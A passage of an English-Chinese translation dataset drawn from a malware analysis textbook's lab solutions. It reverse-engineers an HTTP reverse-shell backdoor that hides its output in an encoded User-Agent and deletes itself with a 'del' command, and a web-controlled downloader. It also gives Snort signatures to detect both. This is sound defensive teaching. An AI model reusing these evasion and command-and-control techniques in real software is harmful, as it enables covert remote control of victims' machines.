  zh: 这种恶意软件是一个小型、简单的后门。它的唯一目的是为远程攻击者提供一个不会被常见网络签名检测到的命令行界面。这种特定的恶意软件很可能是攻击者工具包中的丢弃组件，这一点得到了工具尝试删除自己的事实的支持。
- en: '***Detailed Analysis***'
  id: totrans-4848
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: 'We begin by performing dynamic analysis on the malware. The malware initially
    sends a beacon with an odd User-Agent string:'
  id: totrans-4849
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先对恶意软件进行动态分析。恶意软件最初发送一个带有奇特的User-Agent字符串的信标：
- en: GET /tenfour.html HTTP/1.1
  id: totrans-4850
  prefs: []
  type: TYPE_NORMAL
  zh: GET /tenfour.html HTTP/1.1
- en: 'User-Agent: (!<e6LJC+xnBq90daDNB+1TDrhG6aWG6p9LC/iNBqsGi2sVgJdqhZXDZoMMomKGoqx
    UE73N9qH0dZltjZ4RhJWUh2XiA6imBriT9/oGoqxmCYsiYG0fonNC1bxJD6pLB/1ndbaS9YXe9710A
    6t/CpVpCq5m7l1LCqR0BrWy'
  id: totrans-4851
  prefs: []
  type: TYPE_NORMAL
  zh: 'User-Agent: (!<e6LJC+xnBq90daDNB+1TDrhG6aWG6p9LC/iNBqsGi2sVgJdqhZXDZoMMomKGoqx
    UE73N9qH0dZltjZ4RhJWUh2XiA6imBriT9/oGoqxmCYsiYG0fonNC1bxJD6pLB/1ndbaS9YXe9710A
    6t/CpVpCq5m7l1LCqR0BrWy'
- en: 'Host: 127.0.0.1'
  id: totrans-4852
  prefs: []
  type: TYPE_NORMAL
  zh: 'Host: 127.0.0.1'
- en: 'Cache-Control: no-cache'
  id: totrans-4853
  prefs: []
  type: TYPE_NORMAL
  zh: 'Cache-Control: no-cache'
- en: Solutions to Labs
  id: totrans-4854
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**633**'
  id: totrans-4855
  prefs: []
  type: TYPE_NORMAL
  zh: '**633**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4856
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'A short time later, it sends a second beacon: GET /tenfour.html HTTP/1.1'
  id: totrans-4857
  prefs: []
  type: TYPE_NORMAL
  zh: 短时间内，它发送第二个信标：GET /tenfour.html HTTP/1.1
- en: 'User-Agent: Internet Surf'
  id: totrans-4858
  prefs: []
  type: TYPE_NORMAL
  zh: 'User-Agent: Internet Surf'
- en: 'Host: 127.0.0.1'
  id: totrans-4859
  prefs: []
  type: TYPE_NORMAL
  zh: 'Host: 127.0.0.1'
- en: 'Cache-Control: no-cache'
  id: totrans-4860
  prefs: []
  type: TYPE_NORMAL
  zh: 'Cache-Control: no-cache'
- en: '**NOTE**'
  id: totrans-4861
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*If you see the initial beacon but not the second one, your problem may be
    due to the way* *that you are simulating the server. This particular malware uses
    two threads, each of* *which sends HTTP requests to the same server. If one thread
    fails to get a response, the* *entire process exits. If you rely on Netcat or
    some other simple solution for simulating the* *server, you might get the initial
    beacon, but when the second beacon fails, the first will* *quit, too. In order
    to dynamically analyze this malware, you must use two instances of* *Netcat or
    a robust fake server infrastructure such as INetSim.*'
  id: totrans-4862
  prefs: []
  type: TYPE_NORMAL
  zh: '*如果你看到了初始信标但没有第二个信标，你的问题可能是由于你模拟服务器的方式。这种特定的恶意软件使用两个线程，每个线程都向同一服务器发送HTTP请求。如果一个线程未能得到响应，整个进程将退出。如果你依赖于Netcat或其他简单的模拟服务器解决方案，你可能会得到初始信标，但当第二个信标失败时，第一个也会退出。为了动态分析这种恶意软件，你必须使用两个Netcat实例或一个健壮的模拟服务器基础设施，如INetSim。*'
- en: Multiple trials don’t produce changes in the beacon contents, but modifying
    the host or user will change the initial encoded beacon, giving us a clue that
    the source information for the encoded beacon depends on host-specific information.
  id: totrans-4863
  prefs: []
  type: TYPE_NORMAL
  zh: 多次试验不会改变信标内容，但修改主机或用户将改变初始编码信标，这给我们一个线索，即编码信标的信息来源依赖于特定于主机的信息。
- en: Beginning with the networking functions, we see imports for InternetOpenA, InternetOpenUrlA,
    InternetReadFile, and InternetCloseHandle, from the WinINet library. One of the
    arguments to InternetOpenUrlA is the constant 0x80000000\.
  id: totrans-4864
  prefs: []
  type: TYPE_NORMAL
  zh: 从网络功能开始，我们看到从WinINet库中导入了InternetOpenA、InternetOpenUrlA、InternetReadFile和InternetCloseHandle。InternetOpenUrlA的一个参数是常数0x80000000\。
- en: 'Looking up the values for the parameter affected, we see that it represents
    the INTERNET_FLAG_RELOAD flag. When set, this flag produces the Cache-Control:
    no-cache line from the initial beacon, which demonstrates the advantage of using
    these higher-level protocols instead of more basic socket calls. Malware that
    uses basic socket calls would need to explicitly include the Cache-Control: no-cache
    string in the code, thereby opening it up to be more easily identified as malware
    and to making mistakes in its attempts to imitate legitimate traffic.'
  id: totrans-4865
  prefs: []
  type: TYPE_NORMAL
  zh: '查找受影响的参数值，我们看到它代表INTERNET_FLAG_RELOAD标志。当设置时，此标志从初始信标生成Cache-Control: no-cache行，这展示了使用这些高级协议而不是更基本的套接字调用的优势。使用基本套接字调用的恶意软件需要在代码中显式包含Cache-Control:
    no-cache字符串，从而使其更容易被识别为恶意软件，并在尝试模仿合法流量时犯错误。'
- en: How are the two beacons related? To answer this question, we create a cross-reference
    graph of all functions that ultimately use the Internet functions, as shown in
    Figure 14-3L.
  id: totrans-4866
  prefs: []
  type: TYPE_NORMAL
  zh: 两个信标之间有什么关系？为了回答这个问题，我们创建了一个交叉引用图，显示了所有最终使用Internet函数的函数，如图14-3L所示。
- en: As you can see, the malware has two distinct and symmetric parts. Examining
    the first call to CreateThread in WinMain, it is clear that the function at 0x4014C0,
    labeled StartAddress, is the starting address of a new thread. The function at
    0x4015CO (labeled s_thread2_start) is also the starting address of a new thread.
  id: totrans-4867
  prefs: []
  type: TYPE_NORMAL
  zh: 如您所见，恶意软件有两个明显且对称的部分。检查WinMain中的第一个CreateThread调用，很明显，标记为StartAddress的0x4014C0函数是新线程的起始地址。标记为s_thread2_start的0x4015CO函数也是新线程的起始地址。
- en: Examining StartAddress (0x4014C0), we see that in addition to the s_Internet1
    (0x401750) function, it also calls malloc, PeekNamedPipe, ReadFile, ExitThread,
    Sleep, and another internal function. The function at s_thread2_start (0x4015CO)
    contains a similar structure, with calls to s_Internet2 (0x401800), malloc, WriteFile,
    ExitThread, and Sleep. The function PeekNamedPipe can be used to watch for new
    input on a named pipe. (The stdin and stdout associated with a command shell are
    both named pipes.)
  id: totrans-4868
  prefs: []
  type: TYPE_NORMAL
  zh: 检查StartAddress（0x4014C0），我们看到除了s_Internet1（0x401750）函数外，它还调用了malloc、PeekNamedPipe、ReadFile、ExitThread、Sleep和另一个内部函数。s_thread2_start（0x4015CO）函数包含类似的架构，有调用s_Internet2（0x401800）、malloc、WriteFile、ExitThread和Sleep。PeekNamedPipe函数可以用来监视命名管道上的新输入。（与命令外壳关联的stdin和stdout都是命名管道。）
- en: To determine what is being read from or written to by the two threads, we turn
    our attention to WinMain, the source of the threads, as shown in Figure 14-3L.
    We see that before WinMain starts the two threads, it calls the functions CreatePipeA,
    GetCurrentProcess, DuplicateHandle, and CreateProcessA. The function CreateProcessA
    creates a new *cmd.exe* process, and the other functions **634**
  id: totrans-4869
  prefs: []
  type: TYPE_NORMAL
  zh: 要确定两个线程正在读取或写入的内容，我们将注意力转向WinMain，线程的来源，如图14-3L所示。我们看到在WinMain启动两个线程之前，它调用了CreatePipeA、GetCurrentProcess、DuplicateHandle和CreateProcessA函数。CreateProcessA函数创建一个新的*cmd.exe*进程，其他函数**634**
- en: Appendix C
  id: totrans-4870
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4871
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 144](index-668_1.png)'
  id: totrans-4872
  prefs: []
  type: TYPE_IMG
  zh: '![Image 144](index-668_1.png)'
- en: set up the new process so that the stdin and stdout associated with the command
    process handles are available.
  id: totrans-4873
  prefs: []
  type: TYPE_NORMAL
  zh: 设置新进程，以便与命令进程句柄关联的stdin和stdout可用。
- en: '*Figure 14-3L: Function graph for functions connected with Internet functions*
    This malware author follows a common pattern for building a reverse command shell.
    The attacker has started a new command shell as its own process, and started independent
    threads to read the input and write the output to the command shell. The StartAddress
    (0x4014C0) thread checks for new inputs from the command shell using PeekNamedPipe,
    and if content exists, it uses ReadFile to read the data. Once this data is read,
    it sends the **1 4**'
  id: totrans-4874
  prefs: []
  type: TYPE_NORMAL
  zh: '*图14-3L：与互联网功能相关的函数图* 该恶意软件作者遵循构建反向命令外壳的常见模式。攻击者已启动一个新的命令外壳作为其自己的进程，并启动独立的线程来读取输入并将输出写入命令外壳。StartAddress（0x4014C0）线程使用PeekNamedPipe检查来自命令外壳的新输入，如果存在内容，则使用ReadFile读取数据。一旦读取这些数据，它就发送**1
    4**'
- en: content to a remote location using the s_Internet1 (0x401750) function.
  id: totrans-4875
  prefs: []
  type: TYPE_NORMAL
  zh: 使用s_Internet1（0x401750）函数将内容发送到远程位置。
- en: The other s_thread2_start (0x4015C0) connects to a remote location using s_Internet2
    (0x401800), and if there is any new input for the command shell, it writes that
    to the command shell input pipe.
  id: totrans-4876
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个s_thread2_start（0x4015C0）使用s_Internet2（0x401800）连接到远程位置，如果命令外壳有任何新输入，它将写入命令外壳输入管道。
- en: Let’s return to the parameters passed to the Internet functions in s_Internet1
    (0x401750) to look for the original sources that make up these parameters. The
    function InternetOpenUrlA takes a URL as a parameter, which we later see passed
    into the function as an argument and copied to a buffer early in the function.
    In the preceding function labeled StartAddress (0x4014C0), we see that the URL
    is also an argument. In fact, as we trace the source of the URL, we must go all
    the way back to the start of WinMain (0x4011C0) and the call to LoadStringA. Examining
    the resource section of the PE file, we see that it has the URL that was used
    for beaconing. In fact, this URL is used similarly for the beacons sent by both
    threads.
  id: totrans-4877
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们回到s_Internet1（0x401750）中传递给互联网函数的参数，以查找构成这些参数的原始来源。InternetOpenUrlA函数接受一个URL作为参数，我们稍后看到该参数作为参数传递给函数，并在函数早期将其复制到一个缓冲区。在前面的标记为StartAddress（0x4014C0）的函数中，我们看到URL也是一个参数。实际上，当我们追踪URL的来源时，我们必须追溯到WinMain（0x4011C0）的开始和LoadStringA的调用。检查PE文件的资源部分，我们看到它包含用于信标（beaconing）的URL。实际上，这个URL被用于两个线程发送的信标。
- en: We’ve identified one of the arguments to s_Internet1 (0x401750) as the URL.
    The other argument is the User-Agent string. Navigating to s_Internet1
  id: totrans-4878
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已将 s_Internet1 (0x401750) 的一个参数识别为 URL。另一个参数是 User-Agent 字符串。导航到 s_Internet1
- en: (0x401750), we see the static string (!< at the start of the function. This
    matches the start of the User-Agent string seen in the beacon, but it is concatenated
    with a longer string that is passed in as one of the arguments to s_Internet1
    (0x401750). Just before s_Internet1 (0x401750) is called, an Solutions to Labs
  id: totrans-4879
  prefs: []
  type: TYPE_NORMAL
  zh: (0x401750)，我们看到函数开始处的静态字符串 (!<。这与信标中看到的 User-Agent 字符串的开始相匹配，但它与作为 s_Internet1
    (0x401750) 参数之一传递的较长的字符串连接在一起。在调用 s_Internet1 (0x401750) 之前，一个 Solutions to Labs
- en: '**635**'
  id: totrans-4880
  prefs: []
  type: TYPE_NORMAL
  zh: '**635**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4881
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'internal function at 0x40155B takes two input parameters and outputs the primary
    content of the User-Agent string. This encoding function is a custom Base64 variant
    that uses this Base64 string:'
  id: totrans-4882
  prefs: []
  type: TYPE_NORMAL
  zh: 内部函数在 0x40155B 处接受两个输入参数，并输出 User-Agent 字符串的主要内容。此编码函数是一个定制的 Base64 变体，它使用以下
    Base64 字符串：
- en: 'WXYZlabcd3fghijko12e456789ABCDEFGHIJKL+/MNOPQRSTUVmn0pqrstuvwxyz When the initial
    beacon string is decoded, the result is as follows: Microsoft Windows XP [Version
    5.1.2600]'
  id: totrans-4883
  prefs: []
  type: TYPE_NORMAL
  zh: WXYZlabcd3fghijko12e456789ABCDEFGHIJKL+/MNOPQRSTUVmn0pqrstuvwxyz 当初始信标字符串被解码时，结果如下：Microsoft
    Windows XP [版本 5.1.2600]
- en: (C) Copyright 1985-2001 Microsoft Corp.
  id: totrans-4884
  prefs: []
  type: TYPE_NORMAL
  zh: (C) 版权所有 1985-2001 微软公司
- en: C:\Documents and Settings\user\Desktop>
  id: totrans-4885
  prefs: []
  type: TYPE_NORMAL
  zh: C:\Documents and Settings\user\Desktop>
- en: The other thread uses Internet functions in s_Internet2 (0x401800). As already
    mentioned, s_Internet2 uses the same URL parameter as s_Internet1\.
  id: totrans-4886
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个线程使用 s_Internet2 (0x401800) 中的 Internet 函数。如前所述，s_Internet2 使用与 s_Internet1
    相同的 URL 参数。
- en: The User-Agent string in this function is statically defined as the string Internet
    Surf.
  id: totrans-4887
  prefs: []
  type: TYPE_NORMAL
  zh: 此函数中的 User-Agent 字符串被静态定义为字符串 Internet Surf.
- en: The s_thread2_start (0x4015C0) thread, as mentioned earlier, is used to pass
    inputs to the command shell. It also provides a facility for terminating the program
    based on input. If the operator passes the string exit to the malware, the malware
    will then exit. The code block loc_40166B, located in s_thread2_start (0x4015C0),
    contains the reference to the exit string and the strnicmp function that is used
    to test the incoming network content.
  id: totrans-4888
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，s_thread2_start (0x4015C0) 线程用于将输入传递给命令壳。它还提供了一个基于输入终止程序的功能。如果操作员将字符串 exit
    传递给恶意软件，恶意软件将随后退出。位于 s_thread2_start (0x4015C0) 中的代码块 loc_40166B 包含对退出字符串的引用和用于测试传入网络内容的
    strnicmp 函数。
- en: '**NOTE**'
  id: totrans-4889
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*We could also have used dynamic analysis to gain insight into the malware.
    The* *encoding function at 0x40155B could have been identified by the Base64 strings
    it* *contains. By setting a breakpoint at the function in a debugger, we would
    have seen the* *Windows command prompt as an argument prior to encoding. The encoded
    command* *prompt varies a bit based on the specific OS and username, which is
    why we found this* *beacon changing based on the host or user.*'
  id: totrans-4890
  prefs: []
  type: TYPE_NORMAL
  zh: '*我们还可以使用动态分析来深入了解恶意软件。0x40155B 处的编码函数可以通过它包含的 Base64 字符串被识别。通过在调试器中的函数处设置断点，我们会看到编码之前的
    Windows 命令提示作为参数。编码的命令提示根据具体的操作系统和用户名略有不同，这就是为什么我们发现信标根据主机或用户而变化的原因。*'
- en: In summary, each of the two threads handles different ends of the pipes to the
    command shell. The thread with the static User-Agent string gets the input from
    the remote attacker, and the thread with the encoded User-Agent string serves
    as the output for the command shell. This is a clever way for attackers to obfuscate
    their activities and avoid sending command prompts from the compromised server
    in the clear.
  id: totrans-4891
  prefs: []
  type: TYPE_NORMAL
  zh: 总结来说，两个线程分别处理管道到命令壳的不同端。具有静态 User-Agent 字符串的线程从远程攻击者那里获取输入，而具有编码 User-Agent
    字符串的线程作为命令壳的输出。这是攻击者混淆其活动并避免从受损害的服务器中明文发送命令提示的一种巧妙方法。
- en: One piece of evidence that supports the idea that this is a throwaway component
    for an attacker is the fact that the malware tries to delete itself when it exits.
    In WinMain (0x4011C0), there are three possible function end-ings. The two early
    terminations occur when a thread fails to be successfully created. In all three
    terminal cases, there is a call to 0x401880\. The purpose of 0x401880 is to delete
    the malware from disk once the malware exits.
  id: totrans-4892
  prefs: []
  type: TYPE_NORMAL
  zh: 支持这种观点的一个证据是，恶意软件在退出时尝试删除自己。在 WinMain (0x4011C0) 中，有三个可能的功能结束。两个早期终止发生在线程创建失败时。在所有三个终止情况下，都会调用
    0x401880。0x401880 的目的是在恶意软件退出后从磁盘删除恶意软件。
- en: 0x401880 implements the ComSpec method of self-deletion. Essentially, the ComSpec
    method entails running a ShellExecute command with the ComSpec environmental variable
    defined and with the command line
  id: totrans-4893
  prefs: []
  type: TYPE_NORMAL
  zh: 0x401880实现了ComSpec方法的自我删除。本质上，ComSpec方法包括使用定义了ComSpec环境变量的ShellExecute命令，并带有命令行
- en: /c del [executable_to_delete] > nul, which is precisely what 0x401880 does.
  id: totrans-4894
  prefs: []
  type: TYPE_NORMAL
  zh: /c del [executable_to_delete] > nul，这正是0x401880所执行的。
- en: '**636**'
  id: totrans-4895
  prefs: []
  type: TYPE_NORMAL
  zh: '**636**'
- en: Appendix C
  id: totrans-4896
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4897
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Network Signatures**'
  id: totrans-4898
  prefs: []
  type: TYPE_NORMAL
  zh: '**网络签名**'
- en: For signatures other than the URL, we target the static User-Agent field, the
    static characters of the encoded User-Agent, and the length and character restrictions
    of the encoded command-shell prompt, as shown in Listing 14-4L.
  id: totrans-4899
  prefs: []
  type: TYPE_NORMAL
  zh: 对于除了URL之外的其他签名，我们针对静态用户代理字段、静态编码用户代理字符以及编码命令行提示符的长度和字符限制，如列表14-4L所示。
- en: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.1 Suspicious
    User-Agent (Internet Surf)"; content: "User-Agent\:|20|Internet|20|Surf"; http_header;
    sid:20001421; rev:1;)'
  id: totrans-4900
  prefs: []
  type: TYPE_NORMAL
  zh: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.1 可疑的用户代理（网络浏览）";
    content: "User-Agent:|20|Internet|20|Surf"; http_header; sid:20001421; rev:1;)'
- en: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.2 Suspicious
    User-Agent (starts (!<)"; content: "User-Agent\:|20|(!<"; http_header; sid:20001422;
    rev:1;)'
  id: totrans-4901
  prefs: []
  type: TYPE_NORMAL
  zh: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.2 可疑的用户代理（以(!<开头）";
    content: "User-Agent:|20|(!<"; http_header; sid:20001422; rev:1;)'
- en: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.3 Suspicious
    User-Agent (long B64)"; content:"User-Agent\:|20|"; content:!"|20|"; distance:0;
    within:100; pcre:"/User-Agent:\x20[^\x0d]{0,5}[A-Za-z0-9+\/]{100,}/"; sid:20001423;
    rev:1;)
  id: totrans-4902
  prefs: []
  type: TYPE_NORMAL
  zh: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.3 可疑的用户代理（长B64）";
    content:"User-Agent:|20|"; content:!"|20|"; distance:0; within:100; pcre:"/User-Agent:\x20[^\x0d]{0,5}[A-Za-z0-9+\/]{100,}/";
    sid:20001423; rev:1;)
- en: '*Listing 14-4L: Snort signatures for Lab 14-2*'
  id: totrans-4903
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表14-4L：实验14-2的Snort签名*'
- en: In Listing 14-4L, the first two signatures (20001421 and 20001422) are straightforward,
    targeting User-Agent header content that should hopefully be uncommon. The last
    signature (20001423) targets only the length and character restrictions of an
    encoded command-shell prompt, without assuming the existence of the same leading
    characters targeted in 20001422\. Because the signature is looking for a less
    specific pattern, it is more likely to encounter false positives. The PCRE regular
    expression searches for the User-Agent header, followed by a string of at least
    100 characters from the Base64 character set, allowing for up to five characters
    of any value at the start of the User-Agent (as long as they are not line feeds
    indicating a new header). The **1 4**
  id: totrans-4904
  prefs: []
  type: TYPE_NORMAL
  zh: 在列表14-4L中，前两个签名（20001421和20001422）很简单，针对的是用户代理头内容，希望这些内容不太常见。最后一个签名（20001423）仅针对编码命令行提示符的长度和字符限制，而不假设存在与20001422中目标相同的起始字符。因为签名正在寻找一个不那么具体的模式，所以更可能遇到误报。PCRE正则表达式搜索用户代理头，后面跟着至少100个来自Base64字符集的字符串，允许用户代理开头有最多五个任意字符（只要它们不是换行符，表示新的头）。**1
    4**
- en: optional five characters allow a special start to the User-Agent string, such
    as the (!< seen in the malware. The requirement for 100 characters from the Base64
    character set is loosely based on the expected length of a command prompt.
  id: totrans-4905
  prefs: []
  type: TYPE_NORMAL
  zh: 可选的五字符允许用户代理字符串有一个特殊的开头，例如恶意软件中看到的(!<)。对Base64字符集100个字符的要求是基于预期命令提示符长度的估计。
- en: Finally, the negative content search for a space character is purely to increase
    the performance of the signature. Most User-Agent strings will have a space character
    fairly early in the string, so this check will avoid needing to test the regular
    expression for most User-Agent strings.
  id: totrans-4906
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，对空格字符的负内容搜索纯粹是为了提高签名的性能。大多数用户代理字符串在字符串的早期就会有空格字符，所以这个检查将避免对大多数用户代理字符串测试正则表达式。
- en: '**Lab 14-3 Solutions**'
  id: totrans-4907
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验14-3解答**'
- en: '***Short Answers***'
  id: totrans-4908
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-4909
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: 'The hard-coded headers include Accept, Accept-Language, UA-CPU, Accept-Encoding,
    and User-Agent. The malware author mistakenly adds an additional User-Agent: in
    the actual User-Agent, resulting in a duplicate string: User-Agent: User-Agent:
    Mozilla.... The complete User-Agent header (including the duplicate) makes an
    effective signature.'
  id: totrans-4910
  prefs: []
  type: TYPE_NORMAL
  zh: '固定头包括Accept、Accept-Language、UA-CPU、Accept-Encoding和User-Agent。恶意软件作者错误地在一个实际的User-Agent中添加了额外的User-Agent:，导致重复的字符串：User-Agent:
    User-Agent: Mozilla.... 完整的用户代理头（包括重复的部分）构成了一个有效的签名。'
- en: Solutions to Labs
  id: totrans-4911
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解答
- en: '**637**'
  id: totrans-4912
  prefs: []
  type: TYPE_NORMAL
  zh: '**637**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4913
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 2\.
  id: totrans-4914
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: Both the domain name and path of the URL are hard-coded only where the configuration
    file is unavailable. Signatures should be made for this hard-coded URL, as well
    as any configuration files observed. However, it would probably be more fruitful
    to target just the hard-coded components than to link them with the more dynamic
    URL. Because the URL
  id: totrans-4915
  prefs: []
  type: TYPE_NORMAL
  zh: 仅在配置文件不可用的情况下，URL的域名和路径才会被硬编码。应对此硬编码的URL以及观察到的任何配置文件进行签名。然而，可能更有效的是仅针对硬编码的组件进行目标定位，而不是将它们与更动态的URL关联。因为URL
- en: used is stored in a configuration file and can be changed with one of the commands,
    we know that it is ephemeral.
  id: totrans-4916
  prefs: []
  type: TYPE_NORMAL
  zh: 使用的存储在配置文件中，可以通过一个命令进行更改，我们知道它是短暂的。
- en: 3\.
  id: totrans-4917
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The malware obtains commands from specific components of a web page from inside
    noscript tags, which is similar to the Comment field example mentioned in the
    chapter. Using this technique, malware can beacon to a legitimate web page and
    receive legitimate content, making analysis of malicious versus legitimate traffic
    more difficult for a defender.
  id: totrans-4918
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件从noscript标签内的网页特定组件中获取命令，这与章节中提到的注释字段示例类似。使用这种技术，恶意软件可以向合法网页发送信标并接收合法内容，这使得防御者分析恶意流量与合法流量变得更加困难。
- en: 4\.
  id: totrans-4919
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: In order for content to be interpreted as a command, it must include an initial
    noscript tag followed by a full URL (including *http://* ) that contains the same
    domain name being used for the original web page request. The path of that URL
    must end with 96'. Between the domain name and the 96 (which is truncated), two
    sections compose command and arguments (in a form similar to /command/1213141516).
    The first letter of the command must correspond with an allowed command, and,
    when applicable, the argument must be translatable into a meaningful argument
    for the given command.
  id: totrans-4920
  prefs: []
  type: TYPE_NORMAL
  zh: 为了使内容被解释为命令，它必须包含一个初始的noscript标签，后跟一个完整的URL（包括*http://*），该URL包含用于原始网页请求的相同域名。该URL的路径必须以96'结尾。在域名和96（被截断）之间，有两个部分组成命令和参数（形式类似于/command/1213141516）。命令的第一个字母必须与一个允许的命令相对应，并且，当适用时，参数必须可以转换为一个对给定命令有意义的参数。
- en: The malware author limits the strings available to provide clues about the malware
    functionality. When searching for noscript, the malware searches for <no, and
    then verifies the noscript tag with independent and scrambled character comparisons.
    The malware also reuses the same buffer used for the domain to check for command
    content. The other string search for 96' is only three characters, and the only
    other searches are for the / character. When evaluating the command, only the
    first character is considered, so the attacker may, for example, give the malware
    the command to sleep with either the word soft or seller in the web response.
    Traffic analysis might identify the attacker’s use of the word soft to send a
    command to the malware, and that might lead to the mis-guided use of the complete
    word in a signature. The attacker is free to use seller or any other word starting
    with s without modification of the malware.
  id: totrans-4921
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件作者限制了可用于提供有关恶意软件功能线索的字符串。当搜索noscript时，恶意软件搜索<no，然后通过独立和打乱的字符比较验证noscript标签。恶意软件还重复使用用于域的相同缓冲区来检查命令内容。对96'的另一个字符串搜索只有三个字符，而其他搜索仅针对/字符。在评估命令时，只考虑第一个字符，因此攻击者可能，例如，在网页响应中使用单词soft或seller来给恶意软件发送睡眠命令。流量分析可能识别出攻击者使用单词soft向恶意软件发送命令，这可能会导致在签名中使用完整单词的误导性使用。攻击者可以自由使用seller或任何以s开头的其他单词，而无需修改恶意软件。
- en: 5\.
  id: totrans-4922
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: There is no encoding for the sleep command; the number represents the number
    of seconds to sleep. For two of the commands, the argument is encoded with a custom,
    albeit simple, encoding that is not Base64\. The argument is presented as an even
    number of digits (once the trailing 96
  id: totrans-4923
  prefs: []
  type: TYPE_NORMAL
  zh: 睡眠命令没有编码；数字表示睡眠的秒数。对于两个命令，参数使用一种自定义的、尽管简单但不是Base64的编码进行编码。参数以偶数位数字的形式呈现（一旦尾部的96
- en: is removed). Each set of two digits represents the raw number that is an index
    into the array /abcdefghijklmnopqrstuvwxyz0123456789:.. These arguments are used
    only to communicate URLs, so there is no need for capital characters. The advantage
    to this scheme is that it is nonstandard, so we need to reverse-engineer it in
    order to understand its content. The disadvantage is that it is simple. It may
    be identified as suspicious in strings output, and because the URLs always begin
    in the same way, there will be a consistent pattern.
  id: totrans-4924
  prefs: []
  type: TYPE_NORMAL
  zh: is removed). 每组两位数字代表一个原始数字，它是数组 /abcdefghijklmnopqrstuvwxyz0123456789:.. 的索引。这些参数仅用于通信URL，因此不需要大写字母。这种方案的优势在于它是非标准的，因此我们需要逆向工程它以理解其内容。缺点是它很简单。它可能在字符串输出中被识别为可疑，并且因为URL总是以相同的方式开始，所以会有一个一致的模式。
- en: '**638**'
  id: totrans-4925
  prefs: []
  type: TYPE_NORMAL
  zh: '**638**'
- en: Appendix C
  id: totrans-4926
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-4927
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 6\.
  id: totrans-4928
  prefs: []
  type: TYPE_NORMAL
  zh: 6\.
- en: The malware commands include quit, download, sleep, and redirect. The quit command
    simply quits the program. The download command downloads and runs an executable,
    except that, unlike in the previous lab, the attacker can specify the URL from
    which to download. The redirect command modifies the configuration file used by
    the malware so that there is a new beacon URL.
  id: totrans-4929
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件命令包括退出、下载、休眠和重定向。退出命令简单地退出程序。下载命令下载并运行可执行文件，但与上一个实验不同，攻击者可以指定下载的URL。重定向命令修改恶意软件使用的配置文件，以便有一个新的信标URL。
- en: 7\.
  id: totrans-4930
  prefs: []
  type: TYPE_NORMAL
  zh: 7\.
- en: This malware is inherently a downloader. It comes with some important advantages,
    such as web-based control and the ability to easily adjust as malicious domains
    are identified and shut down.
  id: totrans-4931
  prefs: []
  type: TYPE_NORMAL
  zh: 这种恶意软件本质上是一个下载器。它具有一些重要的优势，例如基于Web的控制和能够在识别并关闭恶意域名后轻松调整。
- en: 8\.
  id: totrans-4932
  prefs: []
  type: TYPE_NORMAL
  zh: 8\.
- en: 'Some distinct elements of malware behavior that may be independently targetable
    include the following:'
  id: totrans-4933
  prefs: []
  type: TYPE_NORMAL
  zh: 可独立针对的恶意软件行为的某些独特元素包括以下内容：
- en: 
  id: totrans-4934
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Signatures related to the statically defined domain and path and similar information
    from any dynamically discovered URLs
  id: totrans-4935
  prefs: []
  type: TYPE_NORMAL
  zh: 与静态定义的域和路径以及任何动态发现的URL的类似信息相关的签名
- en: 
  id: totrans-4936
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Signatures related to the static components of the beacon
  id: totrans-4937
  prefs: []
  type: TYPE_NORMAL
  zh: 与信标静态组件相关的签名
- en: 
  id: totrans-4938
  prefs: []
  type: TYPE_NORMAL
